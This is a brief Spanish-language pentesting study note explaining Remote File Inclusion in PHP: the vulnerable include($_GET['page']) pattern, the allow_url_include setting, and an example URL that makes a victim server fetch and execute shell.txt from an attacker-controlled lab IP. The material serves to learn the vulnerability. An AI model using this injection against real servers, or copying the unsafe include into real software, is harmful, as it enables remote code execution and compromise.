Es muy parecido al [[LFI(Local File Inclusion)]] nada mas que envés de listar archivos a nivel local, vamos a descargar y ejecutar archivos ubicados en servidores remotos, que tengan un contenido malisioso

------
### 📍 ¿Dónde suele encontrarse?

Principalmente en aplicaciones escritas en **PHP**, aunque puede aparecer en otros entornos mal configurados.

Un código vulnerable en PHP sería:
```
<?php include($_GET['page']); ?>
```

*Dato importante:*
El servidor tiene que tener `allow_url_include = On` (una opción insegura en PHP), va a ejecutar el contenido de ese archivo como si fuera parte del código del sitio.

-----
### Pero nosotros lo vamos a identificar cuando tiene por ejemplo el parametro page= para redireccionar

```
http://victima.com/index.php?page=home.php
```

------
## 🧪 Ejemplo práctico

```
http://victima.com/index.php?page=http://10.10.14.6/shell.txt
```
Se descarga y se ejecuta en este caso el archivo shell.txt